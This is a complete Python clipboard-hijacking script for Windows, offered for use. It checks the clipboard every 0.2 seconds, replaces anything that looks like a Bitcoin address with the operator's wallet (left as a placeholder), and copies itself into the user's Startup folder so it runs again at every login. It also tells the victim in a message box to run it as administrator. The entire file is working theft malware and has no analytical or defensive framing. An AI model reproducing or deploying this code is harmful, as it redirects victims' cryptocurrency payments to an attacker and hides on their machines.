import clipboard
import sys, os, time
from time import sleep
import ctypes

#######################################
#									  # 
# 			DONT EDIT THIS 			  #
#									  #
#######################################


def is_admin(): #Check For if User IS Admin
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def main(): # Run the mainloop 
	while True: #run loop
		try:
			CCB = clipboard.paste() #Load Text in cilpboard

			if len(CCB) >= 26 and len(CCB) <=58:# Check If wallet to be Standard Format 
				if CCB[0] == "1" or CCB[0] == "3" or CCB[0] == "b" :
					clipboard.copy(NewCCB) # replace the text in cilpboard
		except: pass #if thier is the error pass so we dont break the loop
		
		time.sleep(0.2) # 0.2s sleep So we dont use to much CPU

NewCCB = XXX # YOUR BTC wellet 
 
cwd = os.getcwd() # Get the directory that file is located in

if(('Startup' in cwd) or ('system32' in cwd)): #if directory is Startup or system32 dont add the app to start ups
	print("All OK!")
	main() #run the Program 

else: # if thier is no clone in start ups Make a clone 
	if is_admin(): #Check For if User IS Admin
		os.system(('copy {} "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"').format(str(sys.argv[0]))) 
		print("ok")
		main() 
	else: # if user  IS not admin quit 
		ctypes.windll.user32.MessageBoxW(0,'Run Program As Administer{}'.format(cwd),'ERROR', 1)
		quit()